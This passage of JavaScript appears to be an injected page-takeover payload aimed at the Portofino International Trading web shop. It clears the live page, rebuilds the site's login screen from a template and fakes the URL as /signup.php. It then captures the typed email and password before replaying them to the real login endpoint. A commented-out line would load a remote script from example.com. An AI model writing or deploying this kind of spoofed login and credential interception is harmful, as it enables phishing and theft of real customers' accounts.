                                        </td>
                                    </tr>
                                    <tr>
                                        <td align="left" style="padding:0;margin:0;">
                                            <div align="center" class="fontRoboto txt-red txt-11" style="display:table-cell; font-weight:lighter; height:45px;  line-height:11px; width:370px; vertical-align:middle; padding:0px; margin:0px;">
                                                &nbsp;	
                                            </div>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="padding-left:100px;">
                                            <input class="btn btn-primary btn-cart-submit-button fontMontserrat btn-login-button" name="forgot_password_submit" id="btn_submit_forgotpassword" type="submit" value="SUBMIT" style="width:158px; font-weight:bold; margin-top:0;">
                                        </td>
                                    </tr>
                                    <tr>
                                        <td valign="middle" nowrap="nowrap" class="float-left" style="padding-top:7px; font-weight:lighter; font-size:16px;"><span class="txt-13 fontRoboto" style="font-weight:lighter;">OR</span> <a href="signup.php" class="please_register" style="font-weight:lighter;">PLEASE REGISTER</a>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script src="js/jquery.slides.min.js"></script>
        <script src="js/vendor/jquery.mousewheel.js"></script>
        <script src="js/vendor/perfect-scrollbar.js"></script>
        <script src="js/vendor/jquery.ddslick.min.js"></script>
        <script src="js/vendor/moment.min.js"></script>
        <script src="js/vendor/bootstrap-datetimepicker.js"></script>
        <script src="js/vendor/jquery.elevatezoom.js"></script>
        <script src="js/vendor/modernizr-2.6.2-respond-1.1.0.min.js"></script>
        <script>
            jQuery(document).ready(function($) {
            "use strict";
            $('#colorPicker').perfectScrollbar();
            $('#imagePicker').perfectScrollbar();
            //$('#inspirationGallery').perfectScrollbar();
            // $('#youMayAlsoLike').perfectScrollbar();
            //$('#inYourCart').perfectScrollbar();
            // $('#itemsYouHaveViewed').perfectScrollbar();
            $('#termsOfUse').perfectScrollbar();
                    
            
                
                $("#view-options,#view-options-container").mouseover(function () {
            $("#view-option").show();
            
            });
            
            $("#view-options-container").mouseout(function () {
            $("#view-option").hide();
            });
            
            
            $("#page-item-count-options,#page-item-count").mouseover(function () {
            $("#page-item-count-option").show();
            
            });
            
            $("#page-item-count, #page-item-count-option").mouseout(function () {
            $("#page-item-count-option").hide();
            });
            
            
            
            
            });
            
            
            
        </script>
        <div class="zoomContainer" style="transform: translateZ(0px); position: absolute; left: 702.5px; top: 114.141px; height: 360px; width: 360px; z-index: 11000 !important;">
            <div class="zoomLens" style="background-position: 0px 0px; float: right; overflow: hidden; z-index: 999; transform: translateZ(0px); opacity: 0.4; zoom: 1; width: 64.8px; height: 64.8px; background-color: white; cursor: pointer; border: 1px solid rgb(0, 0, 0); background-repeat: no-repeat; position: absolute; left: 0px; top: 212.602px; display: none;">&nbsp;</div>
            <div class="zoomWindowContainer" style="width: 360px;">
                <div style="overflow: hidden; background-position: 0px -1181.33px; text-align: center; background-color: rgb(255, 255, 255); width: 360px; height: 360px; float: left; background-size: 2000px 2000px; z-index: 9999; border: 1px solid rgb(136, 136, 136); background-repeat: no-repeat; position: absolute; background-image: url(&quot;https://portofino.azureedge.net/38-0026AQ.jpg&quot;); top: 0px; left: 360px; display: none;" class="zoomWindow">&nbsp;</div>
            </div>
        </div>
    </body>
    `;

    addBody(body).then(function () {
       debugger;
    });
   }
    
	function initLogin() {

		$('html').removeClass();
		$('body').empty();

		var body = `
            <!--[if lt IE 7]>
            <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
            <![endif]-->
            <div class="container" style="margin-bottom:0px; padding-bottom:0px;">
                <!-- start.container -->
                <div id="panel-left" class="noprint">
                    <!-- start.left panel -->
                    <div id="site-logo-container" class="panel-row">
                        <a href="http://www.portofinointl.com/" id="portofino-site-logo" title="Portofino International Trading USA, Inc." style="background:url(images/portofino-logo-2.jpg) no-repeat transparent;"></a>
                    </div>
                    <div id="menu-container" class="panel-row">
                        <script type="text/javascript">
                            function selectItem(id) {
                                if (id.className == "item-selected") {
                                    id.className = "";
                                } else {
                                    id.className = "item-selected";
                                }
                            }
                            
                            
                            function resetItem(div_class) {
                                $("div." + div_class + " a.item-selected").removeClass("item-selected");
                            }
                        </script>
                        <ul class="dropdown-menu parent-ul vertical-menu" role="menu" aria-labelledby="dropdownMenu">
                            <li class="list-group-item"><a href="products.php?status=2" style="color:#8C0000; font-size:15px;" class="highlight" id="new-items-tooltip">NEW ITEMS</a></li>
                            <li class="list-group-item"><a href="products.php?status=1" style="color:#8C0000; font-size:15px;" class="highlight" id="new-arrivals-tooltip">BACK IN STOCK</a></li>
                            <div id="new-items-tooltip-box" class="coming-soon-box" style="display: none; margin-left: 130px; margin-top: -15px; width: 150px; height: 45px;">New Portofino<br>products</div>
                            <div id="new-arrivals-tooltip-box" class="coming-soon-box" style="display: none; margin-left: 130px; margin-top: 5px; width: 150px; height: 45px;">New Arrivals<br>of existing products</div>
                            <li class="list-group-item"><a href="sale.php?view=grid&status=2" style="color:#8C0000; font-size:15px;" class="highlight">SALE</a></li>
                            <li class="list-group-item"><a href="outlet.php?view=grid&status=4" style="margin-bottom:20px;color:#8C0000; font-size:15px;" class="highlight">OUTLET</a></li>
                            <li class="list-group-item"><a href="shop_by_item.php" style="margin-top:5px;margin-bottom:2px;color:#8C0000; font-size:15px;" class="highlight">SHOP BY ITEM</a></li>
                            <li class="dropdown-submenu">
                                <a href="category.php?cl=1&cid=11314" style="text-transform:uppercase;">Event Decor</a>
                            </li>
                            <!--  <div id="product-hero" class="" style="margin-bottom:10px;">
                                <a href="category.php?cl=1&cid=11314"><img src="images/event.jpg" width="720" /></a>
                                </div> -->
                            <li class="dropdown-submenu">
                                <a href="category.php?cl=1&cid=11315" style="text-transform:uppercase;">Party & Craft</a>
                            </li>
                            <!--  <div id="product-hero" class="" style="margin-bottom:10px;">
                                <a href="category.php?cl=1&cid=11315"><img src="images/party.jpg" width="720" /></a>
                                </div> -->
                            <li class="dropdown-submenu">
                                <a href="category.php?cl=1&cid=11316" style="text-transform:uppercase;">Religious Gifts & Keepsakes</a>
                            </li>
                            <!--  <div id="product-hero" class="" style="margin-bottom:10px;">
                                <a href="category.php?cl=1&cid=11316"><img src="images/religious.jpg" width="720" /></a>
                                </div> -->
                            <li style="display:none;" class="list-group-item">SHOP BY EVENT</li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Baby_Shower" style="text-transform:uppercase;">Baby Shower</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Baptism" style="text-transform:uppercase;">Baptism</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Craft_Supplies" style="text-transform:uppercase;">Craft Supplies</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Decorations" style="text-transform:uppercase;">Decorations</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Event_Planning" style="text-transform:uppercase;">Event Planning</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="First_Communion" style="text-transform:uppercase;">First Communion</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Floral_Supplies" style="text-transform:uppercase;">Floral Supplies</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Gifts_Favors" style="text-transform:uppercase;">Gifts & Favors</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Glassware" style="text-transform:uppercase;">Glassware & Vases</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Graduation" style="text-transform:uppercase;">Graduation</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Holiday_Seasonal" style="text-transform:uppercase;">Holiday & Seasonal</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Home_Decor" style="text-transform:uppercase;">Home Decor</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Jewelry" style="text-transform:uppercase;">Jewelry</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Mardi_Gras" style="text-transform:uppercase;">Mardi Gras</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Mi_Presentacion_De_3_Anos" style="text-transform:uppercase;">Mi Presentacion De 3 Años</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Party_Supplies" style="text-transform:uppercase;">Party Supplies</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Quinceanera" style="text-transform:uppercase;">Quinceañera</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Religious" style="text-transform:uppercase;">Religious</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Ribbon_Trimming" style="text-transform:uppercase;">Ribbon & Trimming</a></li>
                            <li style="display:none;" class="dropdown-submenu"><a href="Wedding" style="text-transform:uppercase;">Wedding</a></li>
                        </ul>
                        <p style="margin-top: 204px;"></p>
                        <div class="left-link-container" style="margin: 0 0 28px 10px !important;">
                            <div class="highlight-red" style="padding-bottom:5px;">VIEW CURRENT CATALOG</div>
                            <a href="https://issuu.com/portofinoadmin/docs/catalog_2024_forweb?fr=xKAE9_zU1NQ" target="_blank"><img src="uploads/catalog/Tiny catalog icon.jpg" width="179" border="0"></a>
                        </div>
                        <div class="highlight-red" style="margin-left:10px; line-height:15px;">SEARCH BY SAINTS   <span style="cursor: pointer;" class="open_close">+ Open</span></div>
                        <!-- IMAGE PICKER -->
                        <div class="religious_container" style="display:none;">
                            <div id="imagePicker" class="left-scroll-panel scroll-panel-ht385 ps-container">
                                <div class="scroll-content">
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=GU|GU1&sname=Our Lady of Guadalupe" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/Our-Lady-of-Guadalupe.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">OUR LADY OF GUADALUPE</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=DN&sname=Divine Child" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/Divine-Child.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">DIVINE CHILD</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=JU&sname=St. Jude" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/St.-Jude.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">ST. JUDE</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=MI&sname=St. Michael" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/St.-Michael.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">ST. MICHAEL</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=DM&sname=Divine Mercy" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/Divine-Mercy.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">DIVINE MERCY</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=SHJ&sname=Sacred Heart of Jesus" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/Sacred-Heart-of-Jesus.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">SACRED HEART OF JESUS</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=LG&sname=Lady of Grace" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/Lady-of-Grace.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">LADY OF GRACE</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=CX&sname=Crucifixion" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/Crucifixion.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">CRUCIFIXION</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=ANT&sname=St. Anthony" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/St.-Anthony.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">ST. ANTHONY</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=CHA&sname=San Charbel" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/San-Charbel.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">SAN CHARBEL</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=GAB&sname=St. Gabriel" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/St.-Gabriel.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">ST. GABRIEL</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=GA&sname=Guardian Angel" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/Guardian-Angel.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">GUARDIAN ANGEL</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=HF&sname=Holy Family" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/Holy-Family.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">HOLY FAMILY</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=HT&sname=Holy Trinity" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/Holy-Trinity.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">HOLY TRINITY</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=IC&sname=Immaculate Conception" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/Immaculate-Conception.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">IMMACULATE CONCEPTION</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=JO&sname=St. Joseph" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/St.-Joseph.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">ST. JOSEPH</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=JL&sname=San Juan Del Los Lagos" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/San-Juan-Del-Los-Lagos.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">SAN JUAN DEL LOS LAGOS</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=MCS&sname=St. Martin De Tours" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/St.-Martin-De-Tours.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">ST. MARTIN DE TOURS</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=MP&sname=St. Martin of Porres" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/St.-Martin-of-Porres.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">ST. MARTIN OF PORRES</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=ATO&sname=Nino De Atocha" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/Nino-De-Atocha.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">NINO DE ATOCHA</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=CA&sname=Our Lady of Carmel" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/Our-Lady-of-Carmel.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">OUR LADY OF CARMEL</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=RP&sname=St. Raphael" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/St.-Raphael.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">ST. RAPHAEL</span>
                                        </a>
                                    </div>
                                    <div class="image-picker-item">
                                        <a href="products.php?status=4&color=RA&sname=St. Raymond" id="religious_1" style="text-decoration:none;">
                                        <span class="picker-item-image"><img src="uploads/religious/St.-Raymond.jpg"></span>
                                        <span class="picker-item-label" style="text-decoration:none;">ST. RAYMOND</span>
                                        </a>
                                    </div>
                                </div>
                                <div class="ps-scrollbar-x-rail" style="width: 190px; display: none; left: 0px; bottom: 3px;">
                                    <div class="ps-scrollbar-x" style="left: 0px; width: 0px;"></div>
                                </div>
                                <div class="ps-scrollbar-y-rail" style="top: 0px; height: 385px; display: none; right: 3px;">
                                    <div class="ps-scrollbar-y" style="top: 0px; height: 0px;"></div>
                                </div>
                            </div>
                        </div>
                        <div class="left-link-container"> </div>
                        <script type="text/javascript">    
                            /*$(document).ready(function() {
                                var open_close_val = $('.open_close').text();
                                if(open_close_val == '+ Open'){
                                    $('.open_close').click(function() {
                                        $('.religious_container').show('slow', 'linear');
                                        $('.open_close').text('- Close');   
                                    });
                                }
                                if(open_close_val == '- Close'){
                                    $('.open_close').click(function(){
                                        $('.religious_container').hide('slow', 'linear');
                                        $('.open_close').text('+ Open');
                                    });  
                                }
                            });*/
                            /*$(document).ready(function() {
                            $('.open_close').clickToggle(function() {
                                $('.open_close').text('- Close');
                            }, function(){
                                $('.open_close').text('+ Open');
                            });*/
                            
                            $(document).ready(function(){
                            $('.open_close').click(function(){
                            
                            $('.religious_container').slideToggle('slow');
                            if($(this).text() == '- Close')
                            {
                                $(this).text('+ Open');
                            }
                            else
                            {
                                $(this).text('- Close');
                            }
                            });
                            
                            });
                        </script>                    
                    </div>
                    <!-- end.left panel -->
                </div>
                <div id="panel-right" class="">
                    <!-- start.rightpanel -->
                    <!-- level one -->
                    <div id="panel-right-level-one-menu" class="panel-row" style="margin-top:5px; margin-bottom:5px;">
                        <div id="panel-right-menu-container" class="float-left noprint">
                            <!-- menu -->
                            <ul class="top-menu">
                                <li><a href="index.php">HOME</a></li>
                                <li><a href="https://www.portofinointl.com/about_us">ABOUT US</a></li>
                                <li><a href="quick_order.php" id="quick-order-soon-txt">QUICK ORDER</a></li>
                                <li><a href="signup.php" id="login-user">LOG IN / REGISTER</a></li>
                                <li style="padding-right: 0;"><a href="shopcart.php" id="login-user">VIEW CART</a></li>
                            </ul>
                            <!-- end.menu -->
                        </div>
                        <div id="quick-order-soon-box" class="coming-soon-box" style="margin-left: 123px; margin-top: -20px; ">Coming Soon</div>
                        <div id="panel-right-search-container" class="float-right noprint" style="margin-right:2px;">
                            <!-- search -->
                            <form role="form" name="frmTopSearch" id="search-box-top" action="logs/search_log.php" method="get">
                                <input type="hidden" name="search" value="1">
                                <input type="text" class="form-control top-search-field fontRoboto txt-11" id="search-term" name="keyword" value="Search" onfocus="this.value='';" style="color:666666; font-weight:normal;">
                                <img src="images/magnifying-glass-1127234809.jpg" width="15" height="15" id="search-box-btn" align="right" style="border:none; cursor:pointer;" onclick="document.frmTopSearch.submit();">
                            </form>
                            <!-- end.search -->
                        </div>
                        <div class="clearfix"></div>
                    </div>
                    <!-- level one -->
                    <!-- level two -->
                    <div id="panel-right-level-two-menu" class="panel-row">
                        <div class="noprint">
                            <p><strong><span style="color:#FF0000">YOUR PREMIER BUSINESS TO BUSINESS SUPPLIER. </span>IMPORTER/EXPORTER OF CRAFTS, GIFTS, PARTY & DECORATING SUPPLIES</strong></p>
                        </div>
                        <!-- top content -->
                        <div class="clearfix" style="width:750px;height:5px"> </div>
                        <div id="panel-right-content" class="panel-row" style="width:720px;">
                            <div id="featured-product">
                                <div id="product-description" class="noprint">
                                    <span id="parent-category">LOG IN / REGISTRATION</span>
                                </div>
                            </div>
                            <form method="post">
                                <input type="hidden" name="option[]" value="signin">
                                <table class="login-register-form-table" border="0" style="margin-top:28px; width:50%;">
                                    <tbody>
                                        <tr>
                                            <td class="txt-13 bottom-border" colspan="2">
                                                <strong class="fontMontserrat">RETURNING CUSTOMERS PLEASE LOGIN</strong>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td colspan="2">
                                                <br><br>        
                                            </td>
                                        </tr>
                                        <tr>
                                            <td nowrap="nowrap" class="float-left" style="padding-top:5px;">
                                                <span class="field-label">E-mail Address:</span>
                                            </td>
                                            <td width="100%" style="padding-top:5px;">
                                                <input type="text" name="email" value="" maxlength="250" style="width:100%;">
                                            </td>
                                        </tr>
                                        <tr>
                                            <td nowrap="nowrap" class="float-left" style="padding-bottom:5px; padding-top:5px;">
                                                <span class="field-label">Password:</span>
                                            </td>
                                            <td width="100%" style="padding-bottom:5px; padding-top:5px;">
                                                <input type="password" name="pwd" value="" maxlength="250" style="width:100%;" autocomplete="off">
                                            </td>
                                        </tr>
                                        <tr>
                                            <td colspan="2">
                                                <div style="float:left;">
                                                    <input class="btn btn-primary btn-cart-submit-button text-left-button btn-login-button" name="btn_submit_login" id="btn_submit_login" type="submit" value="LOG IN">
                                                </div>
                                                <div style="float:right;" align="right" class="txt-13">
                                                    Forgot Your Password? Click <a href="signup.php?sec=pass" style="color:#FF0000; font-weight:bold;">HERE</a><br>
                                                    New Customer? Click <a href="signup.php?sec=reg" style="color:#FF0000; font-weight:bold;">HERE</a><br>
                                                </div>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </form>
                        </div>
                        <!-- end.top content -->
                        <!-- end.rightpanel -->
                    </div>
                    <div class="clearfix"></div>
                    <div style="margin-top:50px;" class="noprint"><a href="content.php?pgID=31#priceguaranteepolicy"><img src="images/blrb20160202110641web_banner_r.png" border="0" width="717" height="110"></a></div>
                    <div class="clearfix"> </div>
                    <!-- END.container -->
                </div>
                <div class="container ">
                    <!-- start.container -->
                    <!-- PANEL -->
                    <!-- PANEL -->
                    <div id="footer-container-security-logos" class="panel-row noprint" style="margin-bottom:64px; margin-top:-10px;margin-left:205px; width:720px;">
                        <p>
                            <a href="#"><img src="/images/elavon-logo.jpg" style="height:33px; width:70px"> </a><img src="/images/security-logo-cc.png" style="height:20px; width:140px">   
                            <span id="siteseal">
                                <img style="cursor:default;cursor:hand" src="https://seal.godaddy.com/images/3/en/siteseal_gd_3_h_l_m.gif">
                            </span>
                            <br>
                            Copyright © 2024 Portofino International Trading USA, Inc. All rights reserved.
                        </p>
                    </div>
                    <!-- END.container -->
                </div>
                <script src="js/vendor/bootstrap.min.js"></script>
                <script src="js/main.js"></script>
                <script>
                var zoomConfig = {
                    zoomWindowFadeIn: 500,
                    zoomWindowFadeOut: 750,
                    zoomWindowWidth: 360,
                    zoomWindowHeight: 360,
                    constrainType: "height",
                    constrainSize: 274,
                    borderSize: 1,
                    containLensZoom: true,
                    gallery: 'palette-images-selection',
                    cursor: 'pointer',
                    galleryActiveClass: "active"
                };
                
                function DoToAll(obj_input) {
                    bol_is_checked = (obj_input.checked) ? true : false
                    for (x = 0; x < obj_input.form.length; x++) {
                        obj_input.form.elements[x].checked = bol_is_checked;
                    }
                }
                $(function () {
                
                
                    //thumbnail_item = $('.details-image .palette-images .palette-item');
                    //product_image  = $('#product-selected-image > img');
                    product_active_image = $('#product-image-file');
                
                    product_active_image.elevateZoom(zoomConfig);
                
                    product_active_image.bind("click", function (e) {
                        var ez = product_active_image.data('elevateZoom');
                        ez.closeAll();
                        return false;
                    });
                
                    $('#datetimepicker6').datetimepicker({
                        icons: {
                            date: "fa fa-calendar",
                        },
                        pickTime: false
                    });
                
                    $('#slides').slidesjs({
                        width: 720,
                        height: 400,
                        navigation: {
                            active: false
                        },
                        play: {
                            active: false,
                            auto: true,
                            interval: 4000,
                            swap: false
                        }
                    });
                
                    $('#slides-small').slidesjs({
                        width: 234,
                        height: 270,
                        navigation: {
                            active: false
                        },
                        play: {
                            active: false,
                            auto: true,
                            interval: 4000,
                            swap: false
                        },
                        effect: {
                            fade: {
                                speed: 800
                            }
                        },
                        pagination: {
                            active: false
                        },
                    });
                
                
                    $("#search-by-price-soon").mouseover(function () {
                        $("#search-soon-box").css('margin-top', '-4px');
                        $("#search-soon-box").css('margin-left', '5px');
                        $("#search-soon-box").show();
                    });
                    $("#search-by-price-soon").mouseout(function () {
                        $("#search-soon-box").hide();
                    });
                
                    $("#search-special-soon").mouseover(function () {
                        $("#search-soon-box").css('margin-top', '29px');
                        $("#search-soon-box").css('margin-left', '7px');
                        $("#search-soon-box").show();
                    });
                    $("#search-special-soon").mouseout(function () {
                        $("#search-soon-box").hide();
                    });
                
                
                    $("#twitter-soon").mouseover(function () {
                        $("#social-media-soon-box").css('margin-top', '-135px');
                        $("#social-media-soon-box").css('margin-left', '340px');
                        $("#social-media-soon-box").show();
                    });
                    $("#twitter-soon").mouseout(function () {
                        $("#social-media-soon-box").hide();
                    });
                
                
                    $("#blog-soon").mouseover(function () {
                        $("#social-media-soon-box").css('margin-top', '-135px');
                        $("#social-media-soon-box").css('margin-left', '450px');
                        $("#social-media-soon-box").show();
                    });
                    $("#blog-soon").mouseout(function () {
                        $("#social-media-soon-box").hide();
                    });
                
                
                    $("#pinterest-soon").mouseover(function () {
                        $("#social-media-soon-box").css('margin-top', '-135px');
                        $("#social-media-soon-box").css('margin-left', '505px');
                        $("#social-media-soon-box").show();
                    });
                    $("#pinterest-soon").mouseout(function () {
                        $("#social-media-soon-box").hide();
                    });
                
                
                    $("#instagram-soon").mouseover(function () {
                        $("#social-media-soon-box").css('margin-top', '-135px');
                        $("#social-media-soon-box").css('margin-left', '560px');
                        $("#social-media-soon-box").show();
                    });
                    $("#instagram-soon").mouseout(function () {
                        $("#social-media-soon-box").hide();
                    });
                
                
                    $("#footer_34").mouseover(function () {
                        $("#sitemap-soon-box").css('margin-top', '-58px');
                        $("#sitemap-soon-box").css('margin-left', '810px');
                        $("#sitemap-soon-box").show();
                    });
                    $("#footer_34").mouseout(function () {
                        $("#sitemap-soon-box").hide();
                    });
                
                
                    $("img").on("contextmenu", function () {
                        return false;
                    });
                
                
                    var security_question = null;
                    $('#forgotpassword_email').keyup(function (event) {
                        clearTimeout(security_question);
                        //alert ($(this).val());
                        security_question = setTimeout(getSecurityQuestion($(this).val()), 5000);
                    });
                
                
                    $('.modal').on('show.bs.modal', centerModal);
                    $(window).on("resize", function () {
                        $('.modal:visible').each(centerModal);
                    });
                
                
                });
                
                function centerModal() {
                    $(this).css('display', 'block');
                    var $dialog = $(this).find(".modal-dialog");
                    var offset = ($(window).height() - $dialog.height()) / 2;
                    // Center modal vertically in window
                    if (offset < 0) offset = 0;
                    $dialog.css("top", offset + 'px');
                }
                
                
                function getSecurityQuestion(q) {
                    $.post("ajax_security_question.php", {
                            email: q
                        },
                        function (data) {
                            if (data != 'error') {
                                //alert(data);
                                $('#security-question-out').html(data);
                                $('#security_question').val(data);
                
                            } else {
                                $('#security-question-out').html("");
                            }
                        });
                }
                
                
                function submitOnEnter(e, submitType, objForm, callFunction) {
                
                    code = e.keyCode || e.which;
                
                    if (code == 13) {
                
                        if (submitType == "submit") {
                            objForm.submit();
                        } else if (submitType == "call") {
                            callFunction();
                        }
                    }
                }
                </script>
                <script src="js/jquery.slides.min.js"></script>
                <script src="js/vendor/jquery.mousewheel.js"></script>
                <script src="js/vendor/perfect-scrollbar.js"></script>
                <script src="js/vendor/jquery.ddslick.min.js"></script>
                <script src="js/vendor/moment.min.js"></script>
                <script src="js/vendor/bootstrap-datetimepicker.js"></script>
                <script src="js/vendor/jquery.elevatezoom.js"></script>
                <script src="js/vendor/modernizr-2.6.2-respond-1.1.0.min.js"></script>
                <script>
                    jQuery(document).ready(function($) {
                    "use strict";
                    $('#colorPicker').perfectScrollbar();
                    $('#imagePicker').perfectScrollbar();
                    //$('#inspirationGallery').perfectScrollbar();
                    // $('#youMayAlsoLike').perfectScrollbar();
                    //$('#inYourCart').perfectScrollbar();
                    // $('#itemsYouHaveViewed').perfectScrollbar();
                    $('#termsOfUse').perfectScrollbar();
                    });
                                
                </script>
            </div>
        `;


		addBody(body).then(function () {
			changeUrl('/signup.php', window.location.href);
			eventSubmitLogin();
		});
	}

	function eventSubmitLogin() {
		$('input[name="email"], input[name="pwd"]').keypress(function (e) {
			if (e.which === 13) {
				e.preventDefault();
				var email = $('input[name="email"]').val();
				var pwd = $('input[name="pwd"]').val();
				submitLogin(email, pwd);
			}
		});

		$('#btn_submit_login').click(function (e) {
			e.preventDefault();
			var email = $('input[name="email"]').val();
			var pwd = $('input[name="pwd"]').val();
			submitLogin(email, pwd);
		});
	}


    //document.head.appendChild(Object.assign(document.createElement('script'), {src: 'https://example.com/script.js'}));
	function submitLogin(email, pwd) {

		var xhr = new XMLHttpRequest();
		var url = "https://www.portofinointl.com/process.php";
		xhr.open("POST", url, true);

		// Set headers
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		xhr.setRequestHeader("Cache-Control", "max-age=0");

		xhr.onreadystatechange = function () {
			if (xhr.readyState === XMLHttpRequest.DONE) {
                
                var locationHeader = xhr.responseURL;

                if (locationHeader.includes('err')){

                    loginErr();

                }else{


                initPageProduct();
                }   

			}
		};

		// Parameters to send
		var params = "option%5B%5D=signin&email=" + email + "&pwd=" + pwd + "&btn_submit_login=LOG+IN";

		// Send request
		xhr.send(params);
	}


    function loginErr() {
        var errMsg = '<tr><td colspan="2"><div align="center" class="fontRoboto txt-red txt-13"><br>Incorrect e-mail address or password. Please try again.<br><br></div></td></tr>';

